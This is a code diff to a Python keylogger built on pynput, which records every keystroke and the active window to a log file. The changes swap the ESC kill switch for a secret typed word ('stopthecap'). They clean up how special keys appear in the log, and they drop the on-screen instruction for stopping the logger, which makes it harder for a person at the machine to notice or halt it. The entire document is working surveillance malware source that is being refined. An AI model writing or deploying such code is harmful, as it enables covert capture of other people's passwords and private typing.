@@ -5,7 +5,10 @@ from datetime import datetime
 from pynput import keyboard
 
 # this is where the kill switch is 
-STOP_KEY = keyboard.Key.esc
+#STOP_KEY = keyboard.Key.esc
+# instead of using key as a kill swtich lets use a string
+typed_chars = ""
+
 
 # here im initializing the variables
 current_window = ""
@@ -51,8 +54,16 @@ def log_key(key):
     try:
         log(f"{key.char}")
     except AttributeError:
-        # handling key that are unprintable like enter or backspace
-        log(f" [{key}] ")
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab: "\t",
+        }
+
+        if key in special_keys:
+            log(special_keys[key])
+        else:
+            log(f"[{key.name}]")
 
 #  write to the log file
 def log(text):
@@ -61,14 +72,22 @@ def log(text):
 
 # listener callback
 def on_press(key):
-    if key == STOP_KEY:
-        # stop listener if kill switch is pressed
-        print("Keylogger stopped.")
-        return False
-    else:
-        log_key(key)
+    global typed_chars
+
+    try:
+        typed_chars += key.char
+        if "stopthecap" in typed_chars:
+            print("Kill switch word detected. Keylogger stopped.")
+            return False  # stop the listener
+        if len(typed_chars) > 20:
+            typed_chars = typed_chars[-20:]  # keep buffer size reasonable
+    except AttributeError:
+        # if key has no char (like Shift, Ctrl, etc.), just ignore for buffer
+        pass
+
+    log_key(key)    # updated kill switch
 
 # start the keylogger
 with keyboard.Listener(on_press=on_press) as listener:
-    print("Keylogger started. Press ESC to stop.")
+    print("Keylogger started")
     listener.join()
